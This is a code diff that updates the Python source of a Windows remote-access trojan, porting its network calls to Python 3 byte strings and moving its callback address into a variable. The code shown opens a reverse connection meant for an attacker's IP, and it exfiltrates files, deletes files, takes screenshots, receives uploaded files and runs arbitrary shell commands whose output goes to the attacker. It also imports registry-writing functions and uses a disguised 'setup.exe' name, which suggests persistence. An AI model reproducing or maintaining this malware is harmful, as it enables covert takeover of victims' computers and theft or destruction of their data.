@@ -5,10 +5,11 @@ import time
 import os
 from winreg import HKEY_CURRENT_USER, ConnectRegistry, OpenKey, SetValueEx, KEY_WRITE, REG_SZ
 import shutil
-import PIL
+
 from PIL import ImageGrab
 
 dist = ""
+connectTo = ('localhost', 5005)
 curntfile = sys.argv[0]  # currnt filie name
 servername = "/setup.exe"
 username = os.getenv('USERNAME')
@@ -64,7 +65,7 @@ def do_work(forever=True):
             print('Socket Keepalive already on')
 
         try:
-            s.connect(('localhost', 5005))  # YOUR IP AND PORT FOR REVERSE CONNECTION
+            s.connect(connectTo)  # YOUR IP AND PORT FOR REVERSE CONNECTION
 
         except Exception as ex:
             print('Smth wrong...')
@@ -90,35 +91,36 @@ def do_work(forever=True):
                                 s.sendall(filedata)
                         f.close()
                         time.sleep(0.8)
-                        s.sendall('EOFEOFX')
+                        s.sendall(b'EOFEOFX')
                     else:
-                        s.send('EOFEOFX')
-                        s.send('invalid filename')
+                        s.send(b'EOFEOFX')
+                        s.send(b'invalid filename')
                 # invalid filename funtion
                 elif data.startswith('invalid') == True:
-                    s.send('falid invalid filename')
+                    s.send(b'falid invalid filename')
                 # delete file funtion
                 elif data.startswith('del') == True:
                     filename = data[4:]
                     try:
                         os.remove(filename)
-                        s.send('Deleted')
+                        s.send(b'Deleted')
                     except os.error:
-                        s.send('Invalid filename')
+                        s.send(b'Invalid filename')
 
                 # dir changing
                 elif data.startswith('cd') == True:
                     path = data[3:]
+                    print(path)
                     try:
                         os.chdir(path)
                         s.sendall(os.getcwd())
                     except:
-                        s.send("path not found")
+                        s.send(b"path not found")
                 # screenshot function
                 elif data.startswith('pic') == True:
                     image = data[4:]
                     ImageGrab.grab().save(image, "PNG")
-                    s.send('image saved')
+                    s.send(b'image saved')
                 # uploader
                 elif data.startswith("upload") == True:
                     downFile = data[7:]
@@ -136,7 +138,7 @@ def do_work(forever=True):
                                     l = s.recv(1024)
                             break
                         f.close()
-                        s.send('Done')
+                        s.send(b'Done')
                     except:
                         pass
 
@@ -149,7 +151,7 @@ def do_work(forever=True):
                     # send output to attacker
 
                     if len(stdout_value) == 0:
-                        s.send("command successfull")
+                        s.send(b"command successfull")
                     else:
                         s.send(stdout_value)
 
